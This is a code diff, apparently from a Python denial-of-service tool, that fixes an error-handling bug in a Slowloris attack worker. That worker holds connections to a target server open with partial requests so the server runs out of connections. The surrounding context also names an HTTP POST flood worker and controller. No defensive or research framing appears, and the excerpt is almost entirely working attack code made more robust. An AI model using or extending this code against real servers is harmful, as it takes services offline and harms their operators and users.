@@ -226,12 +226,17 @@ def http_post_worker(stop_event, pause_event, target_ip, port, host_header):
             time.sleep(0.5)
 
 
-# --- NEW: Slowloris Attack Worker ---
-# This is a "low and slow" attack. It holds connections open by sending partial
-# data, exhausting the server's connection pool without a high volume of traffic.
+# --- Corrected and Robust Slowloris Attack Worker ---
+# This version prevents the "UnboundLocalError" by initializing `s` to None.
 def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
-    """Worker thread that opens and maintains a single Slowloris connection."""
+    """
+    Worker thread that opens and maintains a single Slowloris connection.
+    This implementation is robust against connection errors.
+    """
+    # 1. Initialize `s` to None before the try block. This ensures it always exists.
+    s = None
     try:
+        # 2. The assignment happens inside the try block.
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
         s.connect((target_ip, port))
@@ -260,7 +265,11 @@ def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
     except socket.error:
         pass  # Initial connection failed, thread terminates
     finally:
-        s.close()
+        # 3. In the finally block, check if `s` was successfully assigned a socket
+        #    before trying to call .close() on it. If `s` is still None, this
+        #    condition is false and the .close() method is never called.
+        if s:
+            s.close()
 
 
 # --- NEW: HTTP POST Flood Controller ---
